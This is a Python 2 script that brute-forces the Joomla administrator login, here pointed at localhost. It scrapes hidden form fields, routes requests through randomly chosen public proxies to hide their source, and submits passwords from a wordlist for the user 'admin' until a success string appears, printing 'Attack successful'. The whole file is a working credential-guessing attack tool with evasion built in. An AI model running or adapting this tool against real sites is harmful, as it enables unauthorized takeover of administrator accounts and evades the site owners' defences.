import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser
import socket
import signal

from multiprocessing import Process, Queue
import multiprocessing

import random
import datetime
import re

import proxy_manager


class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name,value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value
			if tag_name is not None:
				self.tag_results[tag_name] = value



# Initialse proxy resources
"""
proxy_manager.create_proxyFileFromWeb()
proxy_manager.test_all_proxy(10)
"""
proxy_manager.update_proxyFileFromWeb()

# general settings
username = "admin"
wordlist_file = "dict.txt"
successful = False
use_proxy = True

# target specific settings
target_url = "http://localhost/joomla/administrator/index.php"
target_post = "http://localhost/joomla/administrator/index.php"
username_field= "username"
password_field= "passwd"
success_check = "Configuration"


# get response from web (TODO : put the all thing in the for loop)
if(use_proxy):
	
	# define proxy file (use secured)
	now = datetime.datetime.now()
	month = now.month
	day = now.day
	if(day < 10):
		day = "0"+str(day)
	if(month < 10):
		month = "0"+str(month)
	date = str(day)+"_"+str(month)
	proxy_file_name = "proxyFromWeb_"+date+"_secured.txt"
	
	# TODO : test if proxy_file_name exist


	proxy = proxy_manager.select_randomProxyFromFile(proxy_file_name)
	proxy_handler = urllib2.ProxyHandler({'http': proxy})
	jar = cookielib.FileCookieJar("cookies")
	request = urllib2.Request(target_url)
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar), proxy_handler)
	urllib2.install_opener(opener)
	response = opener.open(target_url)
	page = response.read()
else:
	jar = cookielib.FileCookieJar("cookies")
	request = urllib2.Request(target_url)
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	urllib2.install_opener(opener)
	response = opener.open(target_url)
	page = response.read()



data_in_dict = open("attackDict_test.txt", "r")

for line in data_in_dict:
	
	if(not successful):

		# submit login form

		# parse out the hidden fields
		parser = BruteParser()
		parser.feed(page)

		post_tags = parser.tag_results	

		line = line.split("\n")
		password = line[0]

		# add our username and password fields
		post_tags[username_field] = "admin"
		post_tags[password_field] = str(password)

		try:
			login_data = urllib.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)
			login_result = login_response.read()
		
			if success_check in login_result:
				print "--------------------------"
				print "[*] Attack successful."
				print "[*] Password: %s" % password
				print "--------------------------"
				successful = True

		except urllib2.HTTPError, error:
			contents = error.read()
			print "[+] Failed : "+str(password)
	
	else:
		print "[*] Attack terminated"

	


data_in_dict.close()

